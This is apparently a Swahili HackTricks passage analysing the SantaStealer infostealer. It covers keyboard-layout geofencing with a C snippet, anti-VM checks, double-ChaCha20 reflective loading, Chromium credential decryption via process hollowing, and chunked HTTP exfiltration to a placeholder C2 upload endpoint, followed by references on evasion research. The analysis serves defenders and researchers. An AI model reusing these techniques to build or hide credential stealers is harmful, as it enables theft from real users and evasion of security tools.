## Mbinu za SantaStealer za Kukwepa Ugunduzi Bila Faili na Kuiba Vitambulisho

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyounganisha AV bypass, anti-analysis na ufikiaji wa credentials katika workflow moja.<sup>[[24]](#references)</sup>

### Uchujaji kwa mpangilio wa kibodi na ucheleweshaji wa sandbox

- Alama ya usanidi (`anti_cis`) huorodhesha mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa mpangilio wa Cyrillic utapatikana, sample huweka alama tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha haitekelezwi kwenye maeneo yaliyotengwa huku ikiiacha artifact ya uchunguzi.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya michakato, huhash kila jina kwa checksum maalum ya rolling, kisha hulinganisha matokeo na blocklist zilizojumuishwa za debugger/sandbox; hurudia checksum hiyo kwa jina la kompyuta na hukagua saraka za kufanya kazi kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (idadi ya chini ya michakato, muda mfupi tangu kuwashwa), huita `OpenServiceA("VBoxGuest")` ili kutambua VirtualBox additions, na hukagua muda kabla na baada ya kulala ili kubaini single-stepping. Kila kitu kinachoibua hit husababisha mchakato kusitishwa kabla ya modules kuanzishwa.

### Helper isiyo na faili + reflective loading mara mbili kwa ChaCha20

- DLL/EXE kuu hujumuisha Chromium credential helper ambayo ama huandikwa kwenye diski au huwekwa mwenyewe kwenye memory; hali isiyo na faili hutatua imports/relocations yenyewe ili kusiandikwe mabaki yoyote ya helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili ikiwa imesimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya hatua zote mbili, hupakia blob hiyo kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zinazotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Taratibu za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza msimbo kwenye Chromium browser inayotumika, kurithi AppBound Encryption keys, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa ndani ya memory kwa modules na uhamishaji wa data kwa HTTP katika vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la viashiria vya kazi `memory_generators` na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya muda wa kujiunga wa takriban sekunde 45.
- Baada ya kukamilika, kila kitu hubanwa kuwa ZIP kwa kutumia library ya `miniz` iliyounganishwa kistatiki na kuhifadhiwa kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` hulala kwa sekunde 15 na kutuma archive kwa HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikiiga mpaka wa `multipart/form-data` wa browser (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha upya kumekamilika.

## References

- [1] [Mbinu za Kina za Kukwepa Ulinzi: Module Stomping kwa Usahihi](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blogu](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: hakuna tena upendeleo wa bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC ya call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Mlolongo mpya wa maambukizi na ufichaji unaotegemea ConfuserEx wa DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kukwepa ukaguzi wa Zscaler posture](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza operesheni za awali za ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Windows 11 Forwarded Exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa kutafuta dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa mchakato na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Marejeo ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kianzishi cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDR kwa msaada wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja ngao ya ulinzi ya Windows Defender kwa mbinu ya Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Marejeo ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya Yenye Malengo Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Usimbuaji wa Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda malware ya Node.js kwa kufuatilia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Uharibifu wa Process Parameter](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, na Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ufichaji wa usingizi wa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia vibaya Chrome Remote Desktop katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kugeuza kiendeshi cha kurekebisha cha Defender kuwa primitive ya kernel operation](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo mwenza wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda functions zinazojificha zenyewe kwa kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Msimbo wa InjectSetConsole wa TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Kazi ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kuunda Child Process yenye Input na Output Zilizoelekezwa Upya](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Kuunda upya zana za C# kwa WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kukompile miradi ya C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Uthibitisho wa dhana na msimbo wa DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Kutumia vibaya mambo ya ndani ya thread pool kwa DLL injection isiyotumia shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Seti ya data ya benchmark ya EMBER2024 na zana za thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Kutumia EMBER2024 kutathmini red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Kukwepa utambuzi unaotegemea Machine Learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Mfumo wa upakiaji wa .NET unaotegemea XAML wa NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Orodhesho la AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Mbinu ya IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
